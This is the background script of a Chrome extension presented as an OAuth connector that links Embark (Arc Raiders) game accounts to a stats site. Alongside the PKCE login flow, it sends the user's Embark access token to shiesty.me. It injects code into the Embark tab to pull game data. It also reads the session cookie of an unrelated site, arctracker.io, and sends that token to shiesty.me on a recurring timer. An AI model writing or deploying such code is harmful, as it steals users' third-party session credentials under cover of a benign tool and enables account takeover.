/**
 * RaiderBuddy Embark Connector - Background Service Worker
 *
 * This script facilitates the OAuth PKCE flow:
 * 1. Generates PKCE code verifier and challenge
 * 2. Redirects to auth.embark.net for OAuth
 * 3. The declarativeNetRequest rules intercept the callback
 * 4. Frontend exchanges the code for tokens via Edge Function
 */

// OAuth configuration
const OAUTH_CONFIG = {
  authorizeUrl: 'https://auth.embark.net/oauth2/authorize',
  clientId: 'embark-pioneer',
  redirectUri: 'http://127.0.0.1:49171',
  scope: 'pioneer openid offline',
  tenancy: 'pioneer-live',
};

// Map platform names to Embark's external_provider_name
const PLATFORM_PROVIDER_MAP = {
  steam: 'steam',
  epic: 'epic',
  playstation: 'playstation',
  xbox: 'xbox',
};

const AUTO_SYNC_ALARM_NAME = 'shiesty-auto-sync';
const AUTO_SYNC_INTERVAL_MINUTES = Number.parseInt('15', 10);
const TOKEN_MAX_AGE_MS = 24 * 60 * 60 * 1000;

// Store for pending auth requests
let pendingAuthRequest = null;

// Cached embark data (in-memory for quick access)
let cachedEmbarkData = null;

function getTokenTiming(timestamp = Date.now()) {
  return {
    tokenAcquiredAt: timestamp,
    tokenExpiresAt: timestamp + TOKEN_MAX_AGE_MS,
  };
}

function isTokenExpired(tokenExpiresAt) {
  return !!tokenExpiresAt && Date.now() >= tokenExpiresAt;
}

/**
 * Generate a cryptographically secure random string for PKCE
 * @param {number} length - Length in bytes (will be base64url encoded)
 * @returns {string} Base64url encoded random string
 */
function generateRandomString(length = 32) {
  const array = new Uint8Array(length);
  crypto.getRandomValues(array);
  // Convert to base64url encoding
  return btoa(String.fromCharCode.apply(null, array))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

/**
 * Generate SHA-256 hash and encode as base64url
 * @param {string} plain - The string to hash
 * @returns {Promise<string>} Base64url encoded SHA-256 hash
 */
async function sha256Base64url(plain) {
  const encoder = new TextEncoder();
  const data = encoder.encode(plain);
  const hash = await crypto.subtle.digest('SHA-256', data);
  const hashArray = new Uint8Array(hash);
  return btoa(String.fromCharCode.apply(null, hashArray))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

/**
 * Generate PKCE code verifier and challenge
 * @returns {Promise<{verifier: string, challenge: string}>}
 */
async function generatePKCE() {
  const verifier = generateRandomString(32);
  const challenge = await sha256Base64url(verifier);
  return { verifier, challenge };
}

/**
 * Update dynamic redirect rules based on the return URL
 * Extracts both origin and pathname from returnUrl to redirect back to the exact page
 * Falls back to /my-raider/overview on production if no returnUrl provided
 */
async function updateRedirectRule(returnUrl) {
  // Default values
  let targetOrigin = 'https://shiesty.me';
  let targetPath = '/my-raider/overview';

  if (returnUrl) {
    try {
      const parsedUrl = new URL(returnUrl);
      targetOrigin = parsedUrl.origin;
      // Use the pathname from returnUrl, ensuring we have a valid path
      targetPath = parsedUrl.pathname || '/my-raider/overview';
    } catch {
      // URL parsing failed, use defaults
    }
  }

  // Dynamic rule with higher priority than static rules
  const dynamicRule = {
    id: 1000,
    priority: 2,
    action: {
      type: 'redirect',
      redirect: {
        regexSubstitution: `${targetOrigin}${targetPath}?embark_oauth_callback=1&\\1`,
      },
    },
    condition: {
      regexFilter: '^http://127\\.0\\.0\\.1:49171/\\?(.*)$',
      resourceTypes: ['main_frame'],
    },
  };

  try {
    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: [1000],
      addRules: [dynamicRule],
    });
  } catch {
    // Fall back to static rules if dynamic rules fail
  }
}

/**
 * Start the Embark OAuth flow using PKCE
 * Navigates the SAME TAB to the OAuth flow (Steam, Epic, etc.)
 * After successful auth, declarativeNetRequest redirects back to RaiderBuddy
 */
async function startEmbarkOAuth(platform, sourceTabId, returnUrl) {
  // Clear any cached Embark data to force fresh authentication
  cachedEmbarkData = null;
  await chrome.storage.local.remove(['embarkData', 'timestamp']);
  chrome.action.setBadgeText({ text: '' });

  // Update redirect rule based on the return URL (dev vs prod)
  await updateRedirectRule(returnUrl);

  try {
    // Generate PKCE values
    const { verifier, challenge } = await generatePKCE();
    const state = generateRandomString(16);

    // Store PKCE verifier keyed by state for later retrieval
    const pkceEntry = {
      codeVerifier: verifier,
      platform,
      returnUrl: returnUrl || null,
      sourceTabId,
      timestamp: Date.now(),
    };

    // Get existing PKCE data and merge (to support multiple concurrent flows if needed)
    const existing = await chrome.storage.local.get(['pkceData']);
    const mergedPkceData = { ...(existing.pkceData || {}), [state]: pkceEntry };

    // Clean up old entries (older than 10 minutes)
    const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
    for (const key of Object.keys(mergedPkceData)) {
      if (mergedPkceData[key].timestamp < tenMinutesAgo) {
        delete mergedPkceData[key];
      }
    }

    await chrome.storage.local.set({ pkceData: mergedPkceData });

    // Store pending auth info (for backward compatibility)
    await chrome.storage.local.set({
      pendingAuth: {
        sourceTabId,
        platform,
        returnUrl: returnUrl || null,
        state,
        timestamp: Date.now(),
      },
    });

    // Build the OAuth authorization URL
    const providerName = PLATFORM_PROVIDER_MAP[platform] || 'steam';
    const params = new URLSearchParams({
      skip_link: 'false',
      client_id: OAUTH_CONFIG.clientId,
      response_type: 'code',
      redirect_uri: OAUTH_CONFIG.redirectUri,
      code_challenge: challenge,
      code_challenge_method: 'S256',
      state: state,
      audience: 'https://pioneer.embark.net',
      scope: OAUTH_CONFIG.scope,
      tenancy: OAUTH_CONFIG.tenancy,
      external_provider_name: providerName,
    });

    const authorizeUrl = `${OAUTH_CONFIG.authorizeUrl}?${params.toString()}`;

    let targetTabId = sourceTabId;
    if (!targetTabId) {
      const activeTabs = await chrome.tabs.query({
        active: true,
        currentWindow: true,
      });
      targetTabId = activeTabs?.[0]?.id;
    }

    // Navigate the current tab when possible so auth stays in one browser flow.
    if (targetTabId) await chrome.tabs.update(targetTabId, { url: authorizeUrl });
    else await chrome.tabs.create({ url: authorizeUrl });

    return { success: true, state };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

/**
 * Get PKCE data for a given state
 * @param {string} state - The state parameter from the OAuth callback
 * @param {boolean} consume - If true, mark the data as used (but don't delete immediately)
 * @returns {Promise<{codeVerifier: string, platform: string} | null>}
 */
async function getPKCEData(state, consume = true) {
  const result = await chrome.storage.local.get(['pkceData']);

  if (result.pkceData && result.pkceData[state]) {
    const data = result.pkceData[state];

    if (consume && !data.used) {
      // Mark as used instead of deleting (allows multiple calls due to React re-renders)
      result.pkceData[state].used = true;
      result.pkceData[state].usedAt = Date.now();
      await chrome.storage.local.set({ pkceData: result.pkceData });
    }

    return data;
  }

  return null;
}

/**
 * Clean up old PKCE data entries
 * Called periodically or on extension startup
 */
async function cleanupOldPKCEData() {
  const result = await chrome.storage.local.get(['pkceData']);
  if (!result.pkceData) return;

  const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
  let cleaned = false;

  for (const state of Object.keys(result.pkceData)) {
    const entry = result.pkceData[state];
    // Delete if: older than 10 minutes OR used more than 1 minute ago
    const isOld = entry.timestamp < tenMinutesAgo;
    const isUsedAndStale =
      entry.used && entry.usedAt && Date.now() - entry.usedAt > 60 * 1000;

    if (isOld || isUsedAndStale) {
      delete result.pkceData[state];
      cleaned = true;
    }
  }

  if (cleaned) {
    await chrome.storage.local.set({ pkceData: result.pkceData });
  }
}

/**
 * Store Embark data received from content script
 * This is the key function - it stores the accessToken that allows game data access
 * After storing, redirects back to RaiderBuddy if there's a pending return URL
 */
async function storeEmbarkData(embarkData, senderTabId) {
  cachedEmbarkData = embarkData;
  const timestamp = Date.now();
  await chrome.storage.local.set({
    embarkData,
    timestamp,
    ...getTokenTiming(timestamp),
  });

  // Update badge to show connected status
  chrome.action.setBadgeText({ text: '✓' });
  chrome.action.setBadgeBackgroundColor({ color: '#00ff88' });

  // Push token to shiesty.me backend so it gets linked to the Discord session
  const accessToken =
    embarkData && embarkData.session && embarkData.session.accessToken;
  if (accessToken) {
    fetch('https://shiesty.me/api/extension/token', {
      method: 'POST',
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        token: accessToken,
        source: 'embark-oauth',
        embarkUserId: embarkData.session.embarkUserId || null,
      }),
    }).catch(function () {});
    pushFullSnapshot(embarkData).catch(function () {});
  }

  async function fetchArcTrackerStatsBundle() {
    const ARCTRACKER_STAT_ROUTES = {
      session: '/api/auth/get-session',
      sync: '/api/embark/auto-sync/settings',
      expeditionStatus: '/api/embark/expedition-status',
      summary: '/api/embark/stats/summary',
      weaponKills: '/api/embark/stats/weapon-kills',
      enemyKills: '/api/embark/stats/enemy-kills',
      mapPerformance: '/api/embark/stats/map-performance',
      mappings: '/api/embark/mappings',
    };

    async function fetchArcTrackerRoute(route) {
      const res = await fetch(route, {
        method: 'GET',
        credentials: 'include',
        headers: { accept: 'application/json' },
      });
      const text = await res.text();
      let data = null;
      try {
        data = JSON.parse(text);
      } catch {
        data = text;
      }
      return { route, status: res.status, ok: res.ok, data };
    }

    const [
      session,
      syncSettings,
      expeditionStatus,
      summary,
      weaponKills,
      enemyKills,
      mapPerformance,
    ] = await Promise.all([
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.session),
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.sync),
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.expeditionStatus),
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.summary),
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.weaponKills),
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.enemyKills),
      fetchArcTrackerRoute(ARCTRACKER_STAT_ROUTES.mapPerformance),
    ]);

    return normalizeArcTrackerStats({
      session: session.data,
      syncSettings: syncSettings.data,
      expeditionStatus: expeditionStatus.data,
      summary: summary.data,
      weaponKills: weaponKills.data,
      enemyKills: enemyKills.data,
      mapPerformance: mapPerformance.data,
    });
  }

  function normalizeArcTrackerStats({
    session,
    summary,
    weaponKills,
    enemyKills,
    mapPerformance,
    expeditionStatus,
    syncSettings,
  }) {
    const s = summary ?? {};
    const weapons = weaponKills?.weapons ?? [];
    const enemies = enemyKills?.enemies ?? [];
    const maps = mapPerformance?.maps ?? [];

    const totalRounds = Number(s.totalRounds ?? 0);
    const totalExtracted = Number(s.totalExtracted ?? 0);
    const totalDied = Number(s.totalDied ?? 0);
    const totalTimeMs = Number(s.totalTimeMs ?? 0);
    const totalValueExtracted = Number(s.totalValueExtracted ?? 0);
    const totalValueBroughtIn = Number(s.totalValueBroughtIn ?? 0);
    const totalNetValue = Number(s.totalNetValue ?? 0);
    const totalArcKills = Number(s.totalArcKills ?? 0);
    const totalPlayerKills = Number(s.totalPlayerKills ?? 0);
    const totalKills = totalArcKills + totalPlayerKills;
    const totalDamage = Number(s.totalDamage ?? 0);
    const totalContainersLooted = Number(s.totalContainersLooted ?? 0);

    return {
      account: {
        userId: session?.user?.id ?? null,
        username: session?.user?.name ?? null,
        emailVerified: Boolean(session?.user?.emailVerified),
        sessionExpiresAt: session?.session?.expiresAt ?? null,
      },
      sync: {
        enabled: Boolean(syncSettings?.enabled),
        isEmbarkLinked: Boolean(syncSettings?.isEmbarkLinked),
        isTokenExpired: Boolean(syncSettings?.isTokenExpired),
        consecutiveFailures: Number(syncSettings?.consecutiveFailures ?? 0),
        lastSyncAt: syncSettings?.lastSyncAt ?? null,
        nextSyncAt: syncSettings?.nextSyncAt ?? null,
      },
      expedition: {
        activeSeason: expeditionStatus?.activeSeason ?? null,
        completedExpeditions: expeditionStatus?.completedExpeditions ?? null,
        state: expeditionStatus?.state ?? null,
        currentTier: expeditionStatus?.currentTier ?? null,
        nextTier: expeditionStatus?.nextTier ?? null,
      },
      totals: {
        totalRounds,
        totalExtracted,
        totalDied,
        totalTimeMs,
        totalValueExtracted,
        totalValueBroughtIn,
        totalNetValue,
        totalArcKills,
        totalPlayerKills,
        totalKills,
        totalDamage,
        totalContainersLooted,
      },
      derived: {
        survivalRate:
          totalRounds > 0
            ? Number(((totalExtracted / totalRounds) * 100).toFixed(2))
            : 0,
        deathRate:
          totalRounds > 0
            ? Number(((totalDied / totalRounds) * 100).toFixed(2))
            : 0,
        playerKD:
          totalDied > 0
            ? Number((totalPlayerKills / totalDied).toFixed(2))
            : totalPlayerKills,
        avgRaidTimeMs:
          totalRounds > 0 ? Math.round(totalTimeMs / totalRounds) : 0,
        avgRaidTimeMinutes:
          totalRounds > 0
            ? Number((totalTimeMs / totalRounds / 60000).toFixed(2))
            : 0,
        avgValueExtractedPerRound:
          totalRounds > 0 ? Math.round(totalValueExtracted / totalRounds) : 0,
        avgValueBroughtInPerRound:
          totalRounds > 0 ? Math.round(totalValueBroughtIn / totalRounds) : 0,
        avgNetValuePerRound:
          totalRounds > 0 ? Math.round(totalNetValue / totalRounds) : 0,
        arcKillsPerRound:
          totalRounds > 0
            ? Number((totalArcKills / totalRounds).toFixed(2))
            : 0,
        playerKillsPerRound:
          totalRounds > 0
            ? Number((totalPlayerKills / totalRounds).toFixed(2))
            : 0,
        totalKillsPerRound:
          totalRounds > 0 ? Number((totalKills / totalRounds).toFixed(2)) : 0,
        damagePerRound:
          totalRounds > 0 ? Number((totalDamage / totalRounds).toFixed(2)) : 0,
        containersLootedPerRound:
          totalRounds > 0
            ? Number((totalContainersLooted / totalRounds).toFixed(2))
            : 0,
      },
      topWeapons: weapons.map((weapon) => ({
        weaponAssetId: weapon.weaponAssetId ?? null,
        itemId: weapon.itemId ?? null,
        name: weapon.name ?? 'Unknown Weapon',
        count: Number(weapon.count ?? 0),
      })),
      arcEnemiesByType: enemies.map((enemy) => ({
        targetId: enemy.targetId ?? null,
        name: enemy.name ?? 'Unknown Enemy',
        count: Number(enemy.count ?? 0),
      })),
      mapPerformance: maps.map((map) => {
        const raids = Number(map.raids ?? 0);
        const extracted = Number(map.extracted ?? 0);
        const totalDurationMs = Number(map.totalDurationMs ?? 0);
        const totalNetValue = Number(map.totalNetValue ?? 0);
        return {
          mapTargetId: map.mapTargetId ?? null,
          mapName: map.mapName ?? 'Unknown Map',
          raids,
          extracted,
          totalDurationMs,
          totalNetValue,
          survivalRate:
            raids > 0 ? Number(((extracted / raids) * 100).toFixed(2)) : 0,
          avgDurationMs: raids > 0 ? Math.round(totalDurationMs / raids) : 0,
          avgNetValue: raids > 0 ? Math.round(totalNetValue / raids) : 0,
        };
      }),
    };
  }
  // Check if there's a pending auth with a return URL
  const { pendingAuth } = await chrome.storage.local.get(['pendingAuth']);

  if (pendingAuth && pendingAuth.returnUrl) {
    // Clear the pending auth
    await chrome.storage.local.remove(['pendingAuth']);

    // Redirect the current tab (where Embark is open) back to RaiderBuddy
    const tabToRedirect = senderTabId || pendingAuth.sourceTabId;
    if (tabToRedirect) {
      try {
        await chrome.tabs.update(tabToRedirect, { url: pendingAuth.returnUrl });
      } catch (e) {
        // Try to find the tab that's on id.embark.games
        const tabs = await chrome.tabs.query({
          url: 'https://id.embark.games/*',
        });
        if (tabs.length > 0) {
          await chrome.tabs.update(tabs[0].id, { url: pendingAuth.returnUrl });
        }
      }
    }
  } else if (pendingAuthRequest && pendingAuthRequest.tabId) {
    // Legacy: send message to the original tab (for when new tab was opened)
    try {
      await chrome.tabs.sendMessage(pendingAuthRequest.tabId, {
        type: 'EMBARK_AUTH_SUCCESS',
        data: embarkData,
        platform: pendingAuthRequest.platform,
      });
    } catch (e) {
      // Could not send to tab
    }
    pendingAuthRequest = null;
  }
}

async function fetchEmbarkBundle(accessToken) {
  const headers = {
    Authorization: `Bearer ${accessToken}`,
    Accept: 'application/json',
  };
  const roots = [
    'https://api.embark.games/arc-raiders/v2',
    'https://api.embark.games/arc-raiders',
  ];
  const endpoints = [
    'profile',
    'inventory',
    'rounds',
    'hideout',
    'loadout',
    'blueprints',
    'quests',
    'projects',
  ];
  const out = {};
  for (const root of roots) {
    let okCount = 0;
    for (const endpoint of endpoints) {
      try {
        const response = await fetch(`${root}/${endpoint}`, { headers });
        if (response.ok) {
          out[endpoint === 'inventory' ? 'stash' : endpoint] =
            await response.json();
          okCount += 1;
        }
      } catch (error) {}
    }
    if (okCount > 0) return out;
  }
  return out;
}

async function pushFullSnapshot(embarkData) {
  const accessToken = embarkData?.session?.accessToken;
  if (!accessToken || accessToken === '[stored in database]') {
    return { success: false, error: 'NOT_LINKED' };
  }

  const timing = await chrome.storage.local.get(['tokenExpiresAt']);
  if (isTokenExpired(timing.tokenExpiresAt)) {
    return { success: false, error: 'REAUTH_REQUIRED' };
  }

  const tabs = await chrome.tabs.query({ url: 'https://id.embark.games/*' });
  if (!tabs.length || !tabs[0].id) {
    return { success: false, error: 'EMBARK_TAB_REQUIRED' };
  }

  const results = await chrome.scripting.executeScript({
    target: { tabId: tabs[0].id },
    func: fetchEmbarkBundle,
    args: [accessToken],
    world: 'MAIN',
  });
  const bundle = results?.[0]?.result || {};
  if (!Object.keys(bundle).length) {
    return { success: false, error: 'NO_EMBARK_DATA' };
  }

  const arcTrackerStats = await fetchArcTrackerStatsBundle();
  bundle.arcTrackerStats = arcTrackerStats;

  // Read the ArcTracker session cookie for server-side cookie-auth calls
  let arcTrackerSessionToken = null;
  try {
    const cookie = await chrome.cookies.get({
      url: 'https://arctracker.io',
      name: 'better-auth.session_token',
    });
    arcTrackerSessionToken = cookie?.value || null;
  } catch (e) {
    // Cookie API may be unavailable
  }

  const response = await fetch('https://shiesty.me/api/extension/sync', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      source: 'shiestybuddy_v2',
      payload: bundle,
      token: accessToken,
      arcTrackerSessionToken,
    }),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => null);
    return {
      success: false,
      error: data?.error || `SYNC_FAILED_${response.status}`,
    };
  }

  const syncedAt = Date.now();
  const nextSyncAt = syncedAt + AUTO_SYNC_INTERVAL_MINUTES * 60 * 1000;
  await chrome.storage.local.set({
    lastSyncedAt: syncedAt,
    nextSyncAt,
  });

  return {
    success: true,
    syncedAt,
    nextSyncAt,
    data: await response.json().catch(() => null),
  };
}

/**
 * Get stored Embark data
 */
async function getStoredEmbarkData() {
  if (cachedEmbarkData) {
    return { embarkData: cachedEmbarkData, timestamp: Date.now() };
  }

  const result = await chrome.storage.local.get(['embarkData', 'timestamp']);
  if (result.embarkData) {
    cachedEmbarkData = result.embarkData;
  }
  return result;
}

async function getExtensionStatusPayload() {
  const result = await chrome.storage.local.get([
    'embarkData',
    'timestamp',
    'lastSyncedAt',
    'nextSyncAt',
    'tokenAcquiredAt',
    'tokenExpiresAt',
    'autoSync',
  ]);
  const tokenExpiresAt = result.tokenExpiresAt || null;
  return {
    embarkData: result.embarkData || null,
    timestamp: result.timestamp || null,
    lastSyncedAt: result.lastSyncedAt || null,
    nextSyncAt: result.nextSyncAt || null,
    tokenAcquiredAt: result.tokenAcquiredAt || null,
    tokenExpiresAt,
    reauthRequired: isTokenExpired(tokenExpiresAt),
    autoSync: result.autoSync || null,
  };
}

/**
 * Request session check from Embark tab
 */
async function requestSessionFromEmbarkTab() {
  // Find any open id.embark.games tabs
  const tabs = await chrome.tabs.query({ url: 'https://id.embark.games/*' });

  if (tabs.length > 0) {
    try {
      await chrome.tabs.sendMessage(tabs[0].id, {
        type: 'CHECK_EMBARK_SESSION',
      });
      return true;
    } catch (e) {
      // Could not message Embark tab
    }
  }

  return false;
}

/**
 * Listen for messages from content scripts and popup
 */
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  switch (message.type) {
    // Messages from embark-content.js (on id.embark.games)
    case 'EMBARK_SESSION_FOUND':
      // Store the session data received from Embark tab
      // Pass the sender tab ID so we can redirect it back to RaiderBuddy
      storeEmbarkData(message.data, sender.tab?.id);
      sendResponse({ success: true });
      break;

    case 'EMBARK_SESSION_NOT_FOUND':
      sendResponse({ success: true });
      break;

    case 'ON_LOGIN_PAGE':
      // Content script detected we're on the login page
      // Try to fetch the redirect URL
      (async () => {
        try {
          const response = await fetch(message.url, {
            method: 'GET',
            credentials: 'include',
          });

          // Check for redirect
          if (response.redirected) {
            sendResponse({ success: true, redirectUrl: response.url });
            return;
          }

          const location = response.headers.get('Location');
          if (location) {
            sendResponse({ success: true, redirectUrl: location });
            return;
          }

          sendResponse({ success: false });
        } catch (error) {
          sendResponse({ success: false, error: error.message });
        }
      })();
      return true; // Keep channel open

    // Messages from content.js (on RaiderBuddy) or popup
    case 'START_EMBARK_AUTH':
      // Get the actual URL from the sender tab (more reliable than frontend-passed URL)
      // This ensures we always redirect back to the exact page the user started from
      const senderTabUrl = sender.tab?.url || message.returnUrl;

      // Store the pending request
      pendingAuthRequest = {
        tabId: sender.tab?.id,
        platform: message.platform,
        returnUrl: senderTabUrl,
        timestamp: Date.now(),
      };

      // Start OAuth flow - navigates same tab to OAuth provider
      (async () => {
        try {
          const result = await startEmbarkOAuth(
            message.platform,
            sender.tab?.id,
            senderTabUrl,
          );
          sendResponse(result);
        } catch (error) {
          sendResponse({ success: false, error: error.message });
        }
      })();
      return true; // Keep channel open for async response

    case 'CHECK_EMBARK_SESSION':
      // Check if we have stored Embark data
      (async () => {
        // First check in-memory cache
        if (cachedEmbarkData) {
          sendResponse({ success: true, data: cachedEmbarkData });
          return;
        }

        const result = await getStoredEmbarkData();

        if (result.embarkData && result.timestamp) {
          // Check if data is not too old (1 hour)
          const age = Date.now() - result.timestamp;
          if (age < 60 * 60 * 1000) {
            sendResponse({ success: true, data: result.embarkData });
            return;
          }
        }
        sendResponse({ success: false });
      })();
      return true; // Keep channel open for async response

    case 'GET_EMBARK_STATUS':
      // Get stored data, optionally request fresh from Embark tab
      (async () => {
        const status = await getExtensionStatusPayload();
        if (status.reauthRequired) {
          sendResponse({ success: false, error: 'REAUTH_REQUIRED', data: status });
          return;
        }

        // First try cached data (fastest)
        if (cachedEmbarkData) {
          sendResponse({ success: true, data: { ...cachedEmbarkData, syncStatus: status } });
          return;
        }

        // Try stored data
        const result = await getStoredEmbarkData();

        if (result.embarkData) {
          sendResponse({
            success: true,
            data: { ...result.embarkData, syncStatus: status },
          });
          return;
        }

        // Try to request from open Embark tab
        const requested = await requestSessionFromEmbarkTab();
        if (requested) {
          // Wait a moment for response
          await new Promise((r) => setTimeout(r, 2000));
          const freshResult = await getStoredEmbarkData();
          if (freshResult.embarkData) {
            const freshStatus = await getExtensionStatusPayload();
            sendResponse({
              success: true,
              data: { ...freshResult.embarkData, syncStatus: freshStatus },
            });
            return;
          }
        }

        sendResponse({ success: false });
      })();
      return true; // Keep channel open for async response

    case 'CLEAR_EMBARK_DATA':
      cachedEmbarkData = null;
      chrome.storage.local.remove([
        'embarkData',
        'timestamp',
        'lastSyncedAt',
        'nextSyncAt',
        'tokenAcquiredAt',
        'tokenExpiresAt',
      ]);
      chrome.action.setBadgeText({ text: '' });
      sendResponse({ success: true });
      break;

    case 'TRIGGER_SYNC_NOW':
      (async () => {
        try {
          const result = await getStoredEmbarkData();
          if (!result.embarkData?.session?.accessToken) {
            sendResponse({ success: false, error: 'NOT_LINKED' });
            return;
          }
          sendResponse(await pushFullSnapshot(result.embarkData));
        } catch (error) {
          sendResponse({ success: false, error: error.message });
        }
      })();
      return true;

    case 'SET_AUTO_SYNC':
      (async () => {
        try {
          const enabled = !!message.enabled;
          await chrome.storage.local.set({
            autoSync: { enabled, intervalMinutes: AUTO_SYNC_INTERVAL_MINUTES },
          });
          if (enabled) {
            await chrome.alarms.create(AUTO_SYNC_ALARM_NAME, {
              periodInMinutes: AUTO_SYNC_INTERVAL_MINUTES,
            });
          } else {
            await chrome.alarms.clear(AUTO_SYNC_ALARM_NAME);
          }
          sendResponse({
            success: true,
            enabled,
            intervalMinutes: AUTO_SYNC_INTERVAL_MINUTES,
          });
        } catch (error) {
          sendResponse({ success: false, error: error.message });
        }
      })();
      return true;

    case 'GET_PKCE_DATA':
      // Get PKCE verifier for a given state (used during OAuth callback)
      (async () => {
        if (!message.state) {
          sendResponse({ success: false, error: 'Missing state parameter' });
          return;
        }

        try {
          const pkceData = await getPKCEData(message.state);

          if (pkceData) {
            sendResponse({
              success: true,
              codeVerifier: pkceData.codeVerifier,
              platform: pkceData.platform,
            });
          } else {
            sendResponse({
              success: false,
              error: 'PKCE data not found or expired',
            });
          }
        } catch (error) {
          sendResponse({ success: false, error: error.message });
        }
      })();
      return true; // Keep channel open for async response

    case 'OAUTH_CALLBACK_RECEIVED':
      // Handle OAuth callback notification from content script
      (async () => {
        // The actual token exchange will be done by the frontend
        // Just acknowledge receipt and clear pending auth
        await chrome.storage.local.remove(['pendingAuth']);

        // Update badge to show auth in progress
        chrome.action.setBadgeText({ text: '...' });
        chrome.action.setBadgeBackgroundColor({ color: '#ffaa00' });

        sendResponse({ success: true });
      })();
      return true;

    case 'OAUTH_TOKEN_EXCHANGED':
      // Token exchange completed successfully
      (async () => {
        if (!message.token) {
          sendResponse({ success: false, error: 'TOKEN_REQUIRED' });
          return;
        }

        // Update badge to show connected status
        chrome.action.setBadgeText({ text: '✓' });
        chrome.action.setBadgeBackgroundColor({ color: '#00ff88' });

        // Store some basic data for the popup
        cachedEmbarkData = {
          session: {
            embarkUserId: message.embarkUserId,
            accessToken: message.token,
          },
          profile: message.profile || null,
        };
        const timestamp = Date.now();
        await chrome.storage.local.set({
          embarkData: cachedEmbarkData,
          timestamp,
          ...getTokenTiming(timestamp),
        });

        sendResponse({ success: true });
      })();
      return true;

    default:
      sendResponse({ success: false, error: 'Unknown message type' });
  }

  return false;
});

chrome.alarms.onAlarm.addListener(async (alarm) => {
  if (alarm.name !== AUTO_SYNC_ALARM_NAME) return;
  const { embarkData, autoSync } = await chrome.storage.local.get([
    'embarkData',
    'autoSync',
  ]);
  if (!autoSync?.enabled || !embarkData) return;
  const { tokenExpiresAt } = await chrome.storage.local.get(['tokenExpiresAt']);
  if (isTokenExpired(tokenExpiresAt)) {
    chrome.action.setBadgeText({ text: '!' });
    chrome.action.setBadgeBackgroundColor({ color: '#ff6b6b' });
    return;
  }
  await pushFullSnapshot(embarkData).catch(function () {});
});

/**
 * Initialize extension
 */
chrome.runtime.onInstalled.addListener(async () => {
  chrome.action.setBadgeText({ text: '' });
  // Clean up any stale PKCE data
  await cleanupOldPKCEData();
});

// Check for existing session on startup
chrome.runtime.onStartup.addListener(async () => {
  // Clean up any stale PKCE data
  await cleanupOldPKCEData();

  const result = await getStoredEmbarkData();
  if (result.embarkData) {
    chrome.action.setBadgeText({ text: '✓' });
    chrome.action.setBadgeBackgroundColor({ color: '#00ff88' });
  }
});
